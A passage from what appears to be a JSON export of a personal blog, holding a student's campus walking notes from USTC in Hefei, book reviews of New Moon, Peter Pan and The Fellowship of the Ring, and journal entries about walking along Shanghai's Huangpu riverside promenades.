the\nconclusion that I could not live without the presence of other people,\nthat I am a member of society, and that I have to live with a community\nand friends, not alone like Robinson Crusoe. Sometimes things don\\'t\nwork that way.\n\nThere are students of all races and looking very different. There are\nblack, white, and yellow, but they are kind of tall. What\\'s more, some\npeople wear shorts when the weather is, like, 50 degrees. Other girls\nare dressed really hot. Some people wear heavy masks in school, but most\npeople don\\'t at all.\n\nStudents are walking in groups actively talking about the things that\nthey are doing and fun stuff; nobody is glued to their phones. I mean, I\ndon\\'t see almost anybody looking on social media like in China.\n\nThe classes in high school are mostly small and split into discussions,\nwhich is kind of interesting because you get to know other people. The\nteachers don\\'t do long and boring lectures that much.\n\nI do not want to be required to do lots of things. Teachers and parents\nare like, you should study, and that is your responsibility, without\ntelling you why you should. Anyway, there are lots of people out there\nwell off who do not study but have talent. What I want to do right now\nis to discover the world and understand things; in China, they say like,\ndoing this is harmful to you concentrating on studying and stopping\ndoing it, so people went back to playing video games on their beds.

There\\'s a fruit store on the east\ncampus just beside the cafeteria, so every time I finished lunch, I\\'d\ngo there and pick something. The foods in Hefei are salty, so it\\'s good\nto have something sweet and juicy. The fruits aren\\'t expensive, they\nusually cost me no more than 15 yuan. There were apples, bananas, water\nlemon, kiwi fruit, oranges. The melon is sold in slices. So you pick up\na slice and walk over to the counter, and the man would cut it out for\nyou. You needn\\'t go home and cut the fruit peel the fruit yourself. You\ncan just buy one slice at a time, which is about 3 yuan.\n\nI quickly became fond of eating fruits. After I bought the fruit, you\nknow, the roads outside were pretty crowded, I would walk east down a\npath that leads to a quieter place. The east part of the east campus is\nmostly apartments, and it seemed pretty much like a park. There are few\npeople, and most of those people are old men and women. It is a pretty\npleasant place. There are lots of trees and lawns to walk on.\n\nWalk a little farther and there is the USTC kindergarten. You can see\nsome old man reading his newspaper while waiting for their grandson and\ngranddaughter at around noon. Under the shade of trees sometimes you can\nsee a fat cat. But if you walk too near, the cat will frantically run\naway to some other places he considered safer. Eating fruit under these\ntrees is enjoyable.\n\nSometimes there are a group of old men and women who brought a large bag\nwith them. They pick up trash as they walk around. They are the\nvolunteers who help make the campus clean.\n\nI also liked the nighttime snacking. It isn\\'t anything like the\nnighttime snacks in my high school, believe me. Every night around 11 pm\nsome stalls will arrive on Feixi Road. The road there was lighted up and\nbustling with noise and excitement. Their smells can lure just about\nanybody. There are stinky tofu, kebabs, stewed pear, and cold noodles.\nThe foods are sour and spicy with strong flavors. But when you grow so\nfrustrated with math and physics and still had to prepare for the tests,\neating here is a good option to empty your mind.\n## Academic Spaces and Social Hubs\n\nThe library is on the west side of the cafeteria. It is usually crowded\nwith students, and hard to find a seat since students always occupy\nseats. Then a little north is a cafe called USTC 1958. The cafe is\nreally expensive and popular among students and teachers. The cafe\nmainly sells cakes, and one little cake and costs 30 yuan, more than\naverage eating prices for a whole day. You can seat there as long as you\nwant without ordering anything. I usually rest there for a while.\nThere\\'s also free water and sugar and a toilet inside.\n\nIn warmer weather people chat outside. When winter arrives people\nusually sit inside to avoid the chill.\n\nI saw a lot of familiar people inside the cafe. Once I saw Mr.\u00a0Ye and\nhis wife having a cup of coffee there. Mr.\u00a0Ye is the teacher for\nElectromagnetism. He is a scholar of much knowledge and erudition.\nAnother time I saw the assistant teacher of my physics class there with\nhis girlfriend.\n\nBeside the cafe, there is the statue of Guo, the founder of USTC. He\nstood tall. There are many children playing beside the statue.\n\nWalk to the west and, right in the middle of the east campus is School\nof the Gifted Young. It is a small building of only 4 stories. There is\na tiny computer lab and library inside.\n\nThen to the north side of the east campus, there\\'re two buildings. One\nis for the math and economy department, another is for the department of\nEarth and Space Sciences. They both have 16 stories. The Economy\nDepartment is on the lower floors of the math building. You can find the\nprofessors who taught your math classes on the top floors of the math\nbuilding. Mr.\u00a0Cheng and Mr.\u00a0Sheng are both on the fifteenth floor of\nthat building. You can hear the professor discussing their questions\nfrom the corridor in that building.\n## The View from Above\n\nI really liked the earth & space building. On the sixteenth floor of\nthat building, there\\'s a platform where you can see the roads outside.\nIt was especially beautiful when the sun went down the west, and give\nall the cars and roads a reddish and goldish color. There is the\nhospital and the Anhui restaurant. The city center of Hefei is really\ncrowded and dirty, tall buildings are everywhere.\n\nOn the other side, the whole east campus is visible. The paths look like\nblood vessels, filled with people, bikes, cars going here and there.\n\nThey are doing experiments on that opening platform, something about\nlasers, so the door soon became locked and I could no longer go on that\nplatform. On some nights you can see a green beam that shoots out of the\ntop of the earth & space building and you know they are doing\nexperiments there.\n## Personal Reflections\n\nThere are just so many things going on on campus. Some people say I do\nnot like to take part in activities. That is true, of course. I hadn\\'t\ntaken part in many activities throughout the semester. I had only\nattended the singing party at the end of December. But walking around\nthe campus is all the same. They are just two different ways of\nrelaxation, and I do not care too much about that."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8decc"}, "title": "New Moon Book Review", "date": {"$date": "2022-01-31T09:28:00Z"}, "type": "literature", "access": 1, "body": "## Introduction\n\nThe Twilight series is written by Stephenie Meyer. It immediately got popular and became an international bestseller. Over the past ten years, the books have been beloved by many young adults.\n\nThe four books in the Twilight series are mostly focused on the relationship between Bella Swan and Edward Cullen. Rather than a fantasy about vampires, it is more of a romance novel. Magic is only used to make help make the plot more exciting.\n\nThe second book, New Moon, follows the first book Twilight. It continues with the story of Bella. At the start of the book, Bella turned eighteen. However, at her birthday party, things went wrong and Edward decided to leave her. Bella was devastated over the loss and started having nightmares. She was nearly driven crazy. Finally, she found a friend, Jacob Black. Soon they grew inseparable, and Jacob\u2019s secret as a werewolf was revealed. As the Cullens returned, Bella must choose for herself the road to follow.\n\n![alt text](https://cdn.jimchen.me/ce32594b-76c7-4f95-9dd4-a4a2211c9bb7_image.png)\n## Immortality\n\nIn Twilight, vampires are immortal and can live for hundreds of years. Edward Cullen is 109 years old. However, their appearances hardly change. The Cullens all look very young. It seems that the vampires are perfect, in Bella\u2019s eyes, with strength, speed, and wealth. However, this may not always be the case.\n\nVampires lost their souls. They are always thirsting for blood and can\u2019t help murdering people. They are not allowed to show their secrets to humans and had to follow the rules of the Volturi. They must always be very cautious and go into hiding. Vampires are very lonely. They can never be a part of the human world for long.\n\n![alt text](https://cdn.jimchen.me/9f124970-ec66-4267-a6df-783432a30958_image-1.png)\nThat is why when Bella asked to be a vampire, Edward always refused. There is beauty in the mortal world. She has a future to consider. It is not so easy as that to be a vampire, just a bite and nothing more. Edward insisted on Bella going to college, which is her plan B. He wanted her to at least enjoy a few years of her life. When Edward left Bella in the woods at the beginning of the book, he was hoping that maybe she would start a new life without him.\n\n## Lust\n\nEdward and Bella always lust for each other. When Edward didn\u2019t return for four months, Bella was so depressed that she was just like a zombie, as she described. After watching the movie with Jessica, Bella found Edward\u2019s voice is at the back of her head when she is breaking her promise, which is staying safe. She went over two kinds of solutions over the loss of Edward, being numb, or feeling the pain. She couldn\u2019t resist feeling numb at last, which led to her riding a motorcycle and cliff diving, only to hear the sweet voice at the back of her head.\n\nThe cover of the book shows a tulip losing a drop of its petals. It represents Bella losing a drop of blood, which is a triggering event at the beginning of the story, with Jasper unable to control his instincts and Edward realizing he is putting Bella in danger. It also symbolizes Bella losing Edward, and her tears of pain when Edward is away.\n\n![alt text](https://cdn.jimchen.me/797e643f-de49-4123-954a-4350bd3fc4f7_image-2.png)\nThe book also gives a new image of a vampire. Unlike the one we thought of, they can have a lot of feelings. They can be like humans. They can love and hate, feel pain and happiness as well.\n\n## Choices\n\nPeople\u2019s dreams always disagree with reality. It is choices that are always deciding where we end up. Bella never regrets her choices. She chose without considering herself, but to follow Edward and not hurt anybody else. She chose to stay in Forks when Charlie wanted her to return to her mother Renee. She chose to be friends with Jacob. She chose to break the promises, sometimes putting herself in danger. At the end of the book, she chose to save Edward without hesitation.\n\nBella is always so determined and confident with her choices. What if she chose otherwise? What if she chose to stay with Jacob Black instead? Her life may be completely different.\n\n![alt text](https://cdn.jimchen.me/cd850e98-a792-4c22-a329-4ec51cb31da9_image-3.png)\n## Right and Wrong\n\nBoth the vampires and werewolves in the book have their instincts. They cannot help themselves. However, they always chose not to hurt people. The Cullens chose a vegetarian diet. It can be very hard to make such a simple choice like that. It took Carlisle so many years of practice. It tells us that one can do better in all circumstances.\n\nThe werewolves and vampires are in constant battle. They hate each other. Jacob referred to the Cullens as bloodsuckers. Alice described Jacob as the dog. Werewolves are so easily enraged and sometimes can\u2019t control themselves. Vampires always thirst for blood. Bella was the only human who could get along with both of them.\n\n![alt text](https://cdn.jimchen.me/3089f3e9-1d7c-4e7c-8e16-32a56968ee09_image-4.png)\n## Bella unable to be read\n\nVampires and werewolves are both very strong and have supernatural gifts. However, they both struggle to control their animal instincts. Bella appears to be the strongest emotionally. Some parts of the book are her monologue. She is the only one unable to be read by Edward and Aro. Even Jane, so powerful, can\u2019t hurt her.\n\nBella can keep to herself after half a year. Edward said that human memories can be forgotten over a long time, but Bella didn\u2019t forget her memories. Since Bella\u2019s thoughts are unable to be read by Edward, it created a distance between them. That distance helped a lot in their relationship.\n\n## Love\n\nBella always wants to get equal with Edward. She wanted to be a vampire instead of going to college and becoming older. On her eighteenth birthday, Bella was very sad because she became older than Edward.\n\nEdward offered many things for her, but Bella always refused. He offered to pay her through college and gave her a luxurious car as a birthday present. But Bella thought that they will just put them unequal in their relationship, which may be bad in the end.\n\nEdward thirsted for Bella\u2019s blood whenever he is near her. He always controlled himself, no matter how hard it is. When Bella\u2019s fingers were hurt at the party, Edward did not even breathe when he is near her.\n\n![alt text](https://cdn.jimchen.me/629c5129-7192-4cf5-a9e3-3cd3a0744bf4_image-5.png)\nEdward wandered alone when he left Bella, hunting for Victoria. When Edward knew that Bella died, he was so sad. He always said without hesitation that Bella is the most beautiful thing in this world and he is not going to live without her. Bella is special because she can sacrifice all herself for love and family. She always put Edward at top priority and is eager to die for him. She accepted being grounded by Charlie in the end when she flew to Italy. That is why they are destined to be together.\n\nBella and Jacob\u2019s relationship, however, is very different. Bella found Jacob just because she wanted company. She described him as someone always happy, like her sun.\n\nJacob is from a native American tribe. He is a werewolf. He is very tall and always warm to others. He is the kind of person you can always turn to in trouble. Jacob loved Bella very much. He once said, \"I will always be there for you and won\u2019t ever give up.\" Bella thought herself selfish when being with Jacob. Her love for Edward will never change, yet she did not reject Jacob. As Jacob is like a sun for her, she could not bear to turn away from him at the darkest times of her life.\n\n\u56fe\u7247\n\nJacob helped Bella get out of the solitude she was in. They began to understand each other when Jacob\u2019s secrets are revealed. However, Jacob can never take the place of Edward. Edward and Bella have a connection no matter how far away they are.\n\nJacob acts as a protector in the book. He protected Bella from getting hurt by Laurent or Victoria, the two vampires who are always hunting for her. He saved Bella when she was drowning. He did all that just because he thought it was right. His tribe was to \"protect the people from vampires.\" When Bella turned away from him, he was so heartbroken.\n\nBella ended up with some serious problems at the end of the book. But as she is with Edward, all the problems seem insignificant. The story continues in Eclipse."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8decd"}, "title": "Riverside Promenade in Pudong", "date": {"$date": "2021-08-17T18:08:00Z"}, "type": "journal", "access": 1, "body": "## China Art Museum and Pudong Route\n\nWhen I didn't want to 4 kilometers to Garden Bridge, I usually went on\nline 8 to the China Art Museum. It is seven stops from my previous home.\nI walked along the Pudong Part of the route.\n\nThe Pudong part is more beautiful and better constructed. There are\nair-conditioned little houses facing the river to rest every kilometer.\nSouthward of China Art Museum is Lupu Bridge. Many parks are connected\ntogether. On sunny days many children with their parents go have a\npicnic there. I didn't find any teenager like me, though.\n\n![image](https://cdn.jimchen.me/7328a4aa-2a0e-46c6-95ff-cfe8e08685d5)\n\n\n## Qiantan Park and Beyond\n\nOn rainy days or at night there ate fewer people. I walked along, only\noccasionally seeing cyclers or joggers passing me. Qiantan park is good,\nthere are little ponds and many tall trees. I can always see far on my\nway left, and during the night it feels like looking into the world at a\ndistance. I felt as if I am separated and alone.\n\nContinue going to the south and I came across the Chuanyang River. The\nsmall river is straight and runs straight to the sea. Then I knew I came\nto Sanlin. Go across the bridge, and there is Oriental Sports Center,\nwhere I could take line 8 back home.\n\n![image](https://cdn.jimchen.me/98890660-54da-4394-897e-c98cc3d3572d)\n\n\nIt is far lonelier at Qiantan, where there isn't a person in sight. When\nI went there at night, the whole world was quiet and peaceful. I went\nthere by myself and kept looking at Puxi to see how much distance I had\ncovered. Xupu Bridge is 5 kilometers from Oriental Sports Center. After\nthat is Manlizui green space.\n\n## Xupu Bridge Area\n\n\nDon't try to stop at Xupu Bridge without calling a taxi beforehand, or\nyou get to walk a long way before finding the subway station. Problem\nis, the road is under the highway and many trucks, motorcycles roam\npast. Some parts of the pavement were under construction so when I was\nthere I needed to walk in the middle of the road. Sometimes there are\npeople arguing there. The place is really barren and I had a bad time\nthere. It is even better turning back than walking out at Xupu Bridge.\n\n![image](https://cdn.jimchen.me/4ad8b849-1302-4802-9637-d813991752e6)\n## Xidu Adventure\n\n\nOne summer day two years ago I was eager for an adventure, and I got on\nline 5 and traveled to Xidu station to see Huangpu River there. That\nexperience wasn't pleasant. What I saw, instead of Huangpu River, are\nmany factories and villages on both sides of the river and there are no\npaths along the river to walk comfortably.\n\n![image](https://cdn.jimchen.me/6593d14a-af1a-4d65-b6c7-91a7615d1425)\n## Lujiazui Area\n\n\nOn the Pudong side, there is a lot to see between Nanpu Bridge and\nQichangzhan Ferry. The river travels around the Lujiazui Area, and you\nmay find yourself circling around the tallest towers in Pudong if you\nwalk Northward from Nanpu Bridge. The place is shaped like a mouth.\n\nThere is a tower near Nanpu Bridge on the Puxi side that shows you the\ntemperature. It is tall and I could even see it on my balcony in my\nprevious home. It is about 8 kilometers from my previous home to the\ntemperature building.\n\nThere are many tall buildings on the way, including Citigroup and\nShangrila Hotel. There are sculptures of different kinds of animals.\nThere is also another sculpture showing many little men walking on a\nplank and trying to balance themselves. On the left side, there are\nboating clubs. There are many expensive restaurants along the way. The\nPudong side of the route ends at Yangpu Bridge.\n\n![image](https://cdn.jimchen.me/c2533781-b30b-443f-978b-3f3d8e08561a)\n![image](https://cdn.jimchen.me/a609ce8f-ecda-4202-9bf0-eebd2b9af4f0)\n\n## Day vs Night Walks\n\nWalking in the daytime is really fine. You can see the beautiful scenery\nmore closely. It is always joyous to walk in the sunshine. It is also\nsafer for you won't get lost or trip over something too dark to see. But\nnight has its own charms. Andrew Webber said, \"nighttime sharpens,\nheightens each sensation.\" Though this is a song in an opera, it is\nproved. When you walk along the river at night, everything is more\nstill. In the daytime there are many things to observe, there are just\ntoo much light and sound, filling your ears and eyes. In the night there\nare no more lights than distant street lamps, no more sound to hear, and\none's ears gave way to a lot of different, interesting sounds. There is\nmuch more to be discovered along the river.\n\nI used to have a hard time walking around Zhongxing Road. It was so hard\nto be alone, there are people everywhere. The street is full of\nmotorcycles even at 10 or 11 pm.\n\n## Reflections on Wandering\n\nNow I live in Zhangjiang High Technology park, and I always walk to the\nsuburban if I go wandering around. It was deserted even at 9 pm. There\nare few buses and taxis, and stores are shut down. It is so hard to get\nback. I couldn't walk to wherever I want because there are chances I\ncouldn't get back quickly. There are few lights and people in the\nstreets at night.\n\nI like always like wandering around just for fun. It is one of my\nhobbies now. Sometimes I want to be like Strider, but there is a big\ndifference between what you want to do for fun and your occupation. And\nanyway, walking in those deserted, dangerous place on a dark night is\nnot pleasant and there are always chances for one to get injured\nanywhere along the way."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dece"}, "title": "Peter Pan Book Review", "date": {"$date": "2021-08-17T09:45:00Z"}, "type": "literature", "access": 1, "body": "## Summary\n\nSoloman in Kensington Garden and sends birds to ladies who asked for\nchildren. The birds later become boys or girls. Every child grows up,\nexcept Peter Pan. He flew out of his window when he was a week old and\narrived at Kensington Gardens. When he returned to his mother, he found\nthe window barred and he couldn't go back.\n\nOne day, when the Darling family went to a party and Nana (the nurse who\nis a dog) wasn't on guard, Peter Pan came. He taught the children to fly\nand the darling children, Wendy, John, and Michael flew with him to\nNeverland. Captain Hook, a pirate who is very sinister is their enemy.\nPeter and his boys succeeded in defeating the pirates and killing Hook.\nThe children returned to their homes and grew up. Years later Peter came\nagain for spring cleaning time but found Wendy became a lady. He flew\nwith Jane, her daughter, to Neverland.\n\n## A Simple Story\n\nPeter Pan is a children's classic book. Other children's classic books\ninclude The Wizard of Oz, Black Beauty, and Alice in Wonderland. Those\nbooks can be read by both children and adults, for they usually have a\ndeep meaning based on a simple story.\n\nThe story of Peter Pan is very simple and easy to understand. However,\nwhat's worth noticing is the characters in it and the detailed\ndescription of them. There are many symbols in this book. The symbols or\nstory may not be realistic or strict. One should understand what they\nintended to tell when reading such books and pay attention to the very\nbeautiful style of writing behind it.\n\nFor example, Barrie wrote \"All children could have such recollections,\nfor, having been birds before they were human, they are naturally a\nlittle wild during the first few weeks, and very itchy at the shoulders,\nwhere their wings used to be.\" This is intended to show that children\nare free and have no boundaries, just like a bird that can fly in the\nwild.\n\n## Children vs Adult\n\nIn the book, children are described as \"gay and innocent and heartless.\"\nPeter Pan is always forgetful of things, forgetting about Hook,\nforgetting about time. He is always joyous and ignorant of things that\nhad happened. For example, when he broke into the Darlings' house, he\ntried to glue his shadow on with soap. When Wendy sewed it for him, he\nthought it was him instead of Wendy that fixed his shadow. He was proud\nof himself claims he has never slept when Hook poisoned him. He lent\nHook a hand after Hook was inferior and in a worse position than him. He\nnever knew how to cheat.\n\nMichael, the youngest of the children, drank his medicine when\nMr.\u00a0Darling refused. For his need of good form, Mr.\u00a0Darling gave Nana\nhis medicine after that and tied Nana to a tree. This ignorance and\narrogance caused a lot of trouble later. This shows the cowardly side of\ngrown-ups.\n\nHook and Smee are dark and bad-natured. The pirates care about good\nform, but the real thing is, they are afraid of facing themselves.\n\nHook desperately tried for good form till the last moment of his life,\nclaiming he is the only one sea cook feared. He said he wanted his son\nto have a claw rather than a hand, to show he is not defeated. He was\ntrying to hunt down others all the time. He designed the fight with\nredskins to cheat the boys to go out. Hook clawed Peter when Peter gave\nhim a hand.\n\nIn the book, Hook is being chased endlessly by a ticking crocodile. The\nclock inside shows that time of one's life is going past just every\nmoment, and that one is always being chased and hunted down.\n\nThe boys sleep in one bed and turn together, which showed they are\npractically the same. They argue but are very cooperative. The pirates\nare not. When Hook asked others volunteer to go into the cabin where\nPeter Pan is they all refused. Like dogs, Hook treated the pirates. And\nlike dogs, they showed him their fangs. When they were dying, they\nthought they were the last ones alive. They were not seeking help from\nothers and lost the fight, though one to one they are stronger than the\nboys. Captain Hook is a symbol of many people in this world and the dark\nside of the author himself.\n\n## Sadness in the Loss of Childhood\n\nThis book has a deep sense of melancholy when one reads it many times.\nWhen Maimie left Peter Pan and got back to her mother, afraid of staying\nwith him too long, she could only look across the Serpentine and never\nwent back.\n\nWhen Wendy grew up, she refused to go with Peter to Neverland. She tried\nto be small but couldn't anymore. The questions asked by Peter and the\nobvious answers behind them are very sad. When all is changed and the\nnursery is no longer what it was, Peter was still himself after all\nthose years. He still had those first teeth with him, though he forgot\nhe didn't come for a long time and all about Hook. The children all grew\nup, and John and Michael are no longer sleeping in the same house.\nChildren grew to lose their flying ability and fail to believe. Growing\nup is a process every child goes through. The book ends with Jane being\ngrown-up and Margaret, her daughter, flying to Neverland with Peter Pan.\n\nChildhood symbolizes the thing one went through once but can never\nlinger long. Ultimately, one has to grow up and be exposed to the\ndiverse and unkind world. This is what Barrie wants to tell. This book\ndeals with the thing everybody lost when they become old. The author\nremembers the \"gay and innocent and heartless\" feeling when he was young\nand detest cheating and the unfairness of adults. Childhood is so simple\nand pure for us as one has nothing to care about, and can always be like\nPeter Pan, who forgets just about everything and take no note of the\npassing time. Barrie wants to fly away just like Peter did and enjoy the\nfreedom of the world. In the book, he explained flying as \"being lifted\nby lovely thoughts.\" One fails to fly only when he doesn't believe\nanymore. He also wants a mother to care for him always, as Peter found\nand brought Wendy to Neverland. He expressed his thoughts with metaphors\nin the book. The real world disagrees with Barrie's thoughts and he puts\nthe contradiction down in his book.\n\nIn fact, physically, J M Barrie himself is only a little taller than 5\nfeet and always looked like a child in his life. He is always the same.\nHe found his life hard in society and eventually became friends with\nchildren (the Llewelyn Davies). This relationship is much more\nlong-lasting than his marriage, and the Davies even vacationed with him.\nHe even supported them financially. When the five children grew up,\nhowever, they aren't so close with him anymore. His relationship with\nthem ended tragically when Davies' parents died and one of the children\ndrowned.\n\nThe book tells stories using make-believe and narrative tone. The author\nexpresses his thoughts in a magic world of fairies. He is melancholy for\nthe constant changes in the real world and despises the sinister side of\nadults. He describes Percy Shelley in the third chapter of Peter Pan in\nKensington Gardens. Shelley is as grown-up as he need ever expect to be\nand is never exactly grown-up. He despises money except what you need\nfor today and made a paper boat of his bank note and sent it sailing on\nthe serpentine. This is a reflection of himself."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8decf"}, "title": "The Fellowship of the Ring Book Review", "date": {"$date": "2021-08-08T14:36:00Z"}, "type": "literature", "access": 1, "body": "## Introduction\n\nLord of the Rings (LOTR) is a magic fantasy series written by J R R\nTolkien. There are four books in this series, The Hobbit, The Fellowship\nof the Ring, The Two Towers, The Return of the King.\n\nThe Dark Lord Sauron wanted to reclaim his lost power through the ring\nthat he lost before. Frodo Baggins, a hobbit living in the Shire,\nstarted on his quest to destroy the ring of Sauron.\n\n## Published time\n\nCompared with other famous magic fantasies, LOTR was written very early\nand was enjoyed by readers for many decades. It was published in the\n1950s. The Chronicles of Narnia was written about the same time. Most\npopular fantasy or science fiction series, such as Harry Potter or\nTwilight, were written in the past 30 years. This made Tolkien's fantasy\na classic. The book is also better constructed and detailed. \\## Where\nthe story happens\n\nLOTR is set in middle-earth and concerns no modern world of man. Books\nthat were written later concerned more of the modern world. Harry Potter\nand Twilight series are set in Britain and America. This means they\ninclude the present human beings along with their magical world. Narnia\nseries include a parallel world that has many entrances (like a\nwardrobe).\n\n## Different kinds of people (or creatures)\n\nThere are five kinds of people in LOTR that play an important role.\nThose people are symbolized by the members in the fellowship: wizard,\nhobbit, elf, dwarf man. The villains are orcs, trolls, or hidden\ncreatures. The book gives readers a clear and deep description of the\nfive armies. Their minds and spirits are shown throughout the book.\nHarry Potter is mainly about wizards and muggles, and though they are\nmagical creatures, little is known about each of them and how they live.\nTwilight is about humans and vampires.\n\nThe five kinds of creatures in LOTR all have characteristics of their\nown.\n\nThe dwarves are stout, united, but arrogant. The song \"I see fire\" (in\nthe movie) is all about them. One line goes \"If this is to end in fore,\nthen we should all burn together.\" They call themselves Durin's sons.\nThey are very proud of their ancestors and the gold that they once\npossessed.\n\nMen are the strongest of all. Sauron was defeated by Isildur and armies\nof men. In the fellowship, Aragorn (king and heir of Isildur) and\nBoromir are the toughest. But men constantly desire power and can not\ncontrol themselves in many situations.\n\nElves are wise, quick, and fair. They are described as casting a white\nlight as they go. Their places are beautiful, often making others forget\nthe time and sorrows of the outer world as they dwell there. Their\npeople are wise and always thought about what is needed for the\nfellowship.\n\nHobbits are probably the weakest of all, they like to live a merry life\nin their comfortable house, and most had not heard about the outer world\nin the Shire. Their lives are but little difference over the years. Yet\nGandalf the wizard said \"Saruman believes it is only great power that\ncan hold evil in check. But I found it is the small everyday deeds of\nordinary folk that keep the darkness at bay.\" Hobbits prove to have the\nstrongest wills. Aragorn described them as made of sterner stuff. Bilbo\nBaggins gave out the ring he possessed for many years. Frodo wasn't dead\nwhen he was injured in a fight with the black riders. Evil things can't\nlive among the hobbits.\n\nWizards are the most powerful, but they have their own problems. Gandalf\nthe grey knows many languages and histories of middle earth. Saruman the\nwhite surrendered to Sauron without fighting. They are wise but are\nalways seeking profits.\n\n## The Ring of Sauron\n\nLOTR is about power and its disastrous effect. The ring of Sauron\nsymbolizes this power. Power made Sauron a dark lord, and power drove\nBoromir out of his mind when he longed for the ring. Seeking power,\nIsildur came to his death. Sauron wasn't so evil without the ring. Power\nis described as dangerous in the book. Gandalf insisted on Frodo taking\nthe ring to Mordor, for it is with Frodo that the ring can't work out\nits evil effects. Galadriel, the elven queen, resisted the ring in\nLothlorien for she feared to be evil just like Sauron.\n\nWhy must the ring be destroyed? The book says that even if one can use\nthe ring to defeat the dark lord, he would become a new dark lord, only\nworse. Boromir wanted to use the ring in his own will when he returns to\nMinas Tirith, but he couldn't even control his own mind. The ring bearer\nmust have a strong will and be really powerful to use the ring, but\nthose with strong will and power prove to be even more dangerous with\nthe ring.\n\nYet with power, one can live long without showing signs of age, and rule\nthe world. But the ring is also a thing of deception, as Bilbo claimed\nit was a present from Gollum and instead of his stealing it. Almost all\nthat was seeking power failed and got destroyed in the end. Note that\nthe book is published shortly after World War II. When the book talks\nabout men leading themselves to destruction, it is an indication of what\nwas happening.\n\n## Use of Magic\n\nThere isn't much use of magic in LOTR. In Harry Potter, every fight is\nabout wands and spells. In LOTR fighting still involves much use of\nweapons and strength. Wizards and elves use magic but they use it few\ntimes. The book is more concerned with power.\n\n## Changes in the Movie\n\nThe movie by Peter Jackson is really magnificent. It is carefully, made\nand every scene just attracts you. But the movie is not consistent with\nthe book in many parts.\n\nThe movie left out Tom Bombadil, an important character in the book. Tom\nand Goldberry live in their own lands. Tom sings songs to bar out the\nevil and his land is free from dark forces. The ring has no power over\nhim. Tom provided shelter for Frodo and the hobbits on their way to Bree\nwhen they were pursued by the black riders.\n\nThere are also many other minor changes in the movie. It is not Arwen\nthat saved Frodo when he was injured from the black riders' attack. The\nelf who came for them was a man called Glorfindel. Frodo rode on the\nhorse alone and escaped himself. The flood on the river to Rivendell was\nsummoned by Elrond, the elven king, and Mithrandir (Gandalf). Gimli\ndidn't strike the ring with his ax during the council of Elrond, and the\ncouncil is long and many other things are talked about rather than who\nshould go to Mordor with the ring. The fellowship was later selected\ninstead of volunteered during the council. Gandalf and Saruman didn't\nduel when Saruman was found to have betrayed.\n\nThese changes made the movie more dramatic and appealing but make it\nconfusing to read the book.\n\n## What I dislike about LOTR\n\nLOTR is a masterpiece, speaking of magic fantasy. But there are a few\nthings I don't like about it. Everyone who reads the book or watches the\nmovie knows Frodo and Sam will defeat Sauron eventually before book 1\nends. The ending is so easily revealed. There are many adventures on the\nway but the villains are always defeated, making them repetitive. The\nimportant characters never die. The book is too long. It contains 560\nthousand words and nearly 2000 pages. But that is a big problem for\nother fantasy series. Harry Potter contains over a million words and A\nGame of Thrones is almost twice that number."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded0"}, "title": "Riverside Promenade in Puxi", "date": {"$date": "2021-08-01T19:41:00Z"}, "type": "journal", "access": 1, "body": "## Introduction to the Promenade\n\nRiverside promenade is a great place for walking and to get a splendid\nview. One can always find shelter and water on the way. There are two\nsides of Huangpu River, so there are two routes to go.\n\n## The Puxi Side Experience\n\n\nWhen I lived in Zhongxing Road two years ago I always went walking on\nthe Puxi side of the route. My home was about 3 to 4 kilometers from the\nGarden Bridge on Suzhou Creek, but it often took me an hour to get\nthere. The reason is that Puxi is crowded and there are so many\nmotorcycles around. There are too many small roads and I always had to\nwait for the light to turn green.\n\n![image](https://cdn.jimchen.me/8f80fc34-dfa3-4c2c-a379-dc94e12aee7b)\n\n## Southward Journey\n\nWhen I lived in my previous home I had been to almost everywhere around.\nThere is not a street I did not know in a distance less than 5\nkilometers from my home. I found, among those dirty streets, that the\nriverside Promenade is the best place to go for walking.\n\nOn the weekends I would go walking south of Garden Bridge. Sometimes it\nis crowded there, especially when there is a festival. So many people\nwere there that I couldn't find a seat to enjoy the view. But that is\nabout the only place crowded. Walk southwards and gradually it becomes\nquieter. Go further south, about 4 kilometers and there are few people\nin sight. Then I would see Nanpu Bridge. As I was always tired when\narriving at Nanpu Bridge, I would take line 4 home.\n\n## Northward Adventure\n\n\nSometimes on Sunday afternoon, I went to cram classes in Xueersi. The\nplace is on Dalian Road. Since it starts at 3 pm I would go out at 10 in\nthe morning and have a walk. First I would walk to Garden Bridge. Then I\nwould turn northward. If you walk northward of Garden Bridge there is\nhalf a kilometer where you cannot see Huangpu River since the route\nalong the river is under construction. There is a hotel along the way\nwhich is very expensive and beautiful, where I usually took a rest\ninside. Then after walking half a kilometer I came to a park. Near the\npark is a subway station: International Cruise Terminal, line 12. The\npark is very beautiful. People are playing some game involving jumping\nand swinging inside, but that I took no interest in. There are those\nglasses, on which you can see the history of the International Cruise\nTerminal, including some famous people. The glass is transparent and I\nsaw the tallest buildings in Pudong through them. At night I also saw\nthe building behind me reflected, and it looks like it's in the air in\nPudong. Anyway, that is really funny.\n\n![image](https://cdn.jimchen.me/54aaa521-812b-4463-86aa-bd1182df020b)\n![image](https://cdn.jimchen.me/1dc5251a-1a3e-42b0-b653-2cfdd46db86b)\n\n\nWalking further northward (or maybe to the east) along Huangpu River, I\ncame to the Qinhuangdao ferry. I walked out to the intersection of\nDalian Road and Yangshupu Road. Line 4 is there and I went the rest of\nthe way to Xueersi by subway.\n\n## Yangpu District Discoveries\n\nNorthward of Qinhuangdao Ferry is Yangpu District. When I first went\nthere it was under construction and very deserted. But after a year,\nwhen I was in ninth grade, I found it good to walk after the road along\nthe river was finished. Old people come here to see the history of the\nindustry of Shanghai. Young people go there for fashion, as there are\nsome clothing shops. There are lots of children's playgrounds and\nslides, swings. Little children jumped all over laughing with their\nparents, who escort them there. I came here because I needed to take a\nrest from studying and I was just too bored.\n\n![image](https://cdn.jimchen.me/5e05528a-915b-43d1-993b-579eaf6ee7cb)\n\n\nThere are many places to eat like Burger King, Macdonald on the way.\n\n## Fuxing Island\n\n\nWalk another 6 kilometers and you come to Fuxing Island. The place is\nseparated by a river. That is why it is called an island. You can go\nthere taking line 12.\n\n![image](https://cdn.jimchen.me/3c758621-8ebb-4ae2-b2de-39a6ed82d816)\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8ded1"}, "title": "Green City in Shanghai", "date": {"$date": "2021-07-27T08:00:00Z"}, "type": "journal", "access": 1, "body": "## The Allure of Green City\n\nIf one day I can earn enough money, the first thing I will do is to 